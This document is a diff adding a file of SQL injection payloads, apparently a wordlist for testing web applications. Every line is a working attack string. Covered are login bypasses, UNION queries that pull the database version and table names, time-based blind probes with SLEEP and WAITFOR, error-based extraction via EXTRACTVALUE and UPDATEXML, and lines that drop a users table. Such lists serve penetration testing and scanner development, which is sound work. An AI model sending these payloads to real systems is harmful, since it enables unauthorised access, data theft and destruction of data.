@@ -1,0 +1,53 @@
+# SQL Injection Payloads
+# Error-based
+'
+"
+`
+')
+")
+`)
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+' OR '1'='1' #
+" OR "1"="1" --
+' OR 1=1 --
+" OR 1=1 --
+' OR 1=1 #
+admin' --
+admin" --
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+" UNION SELECT NULL --
+' UNION SELECT 1, @@version --
+' UNION SELECT 1, table_name FROM information_schema.tables --
+1' ORDER BY 1 --
+1' ORDER BY 10 --
+' AND 1=1 --
+' AND 1=2 --
+" AND 1=1 --
+" AND 1=2 --
+' AND 'a'='a
+' AND 'a'='b
+1 OR 1=1
+1' OR '1'='1
+' OR ''='
+" OR ""="
+' OR 1=1 LIMIT 1 --
+' AND SLEEP(5) --
+" AND SLEEP(5) --
+' OR SLEEP(5) --
+1' AND SLEEP(5) --
+'; WAITFOR DELAY '0:0:5' --
+'; SELECT SLEEP(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' UNION SELECT SLEEP(5) --
+' AND IF(1=1, SLEEP(5), 0) --
+' AND IF(1=2, SLEEP(5), 0) --
+' OR IF(1=1, SLEEP(5), 0) --
+1; DROP TABLE users --
+'; DROP TABLE users --
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1) --
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
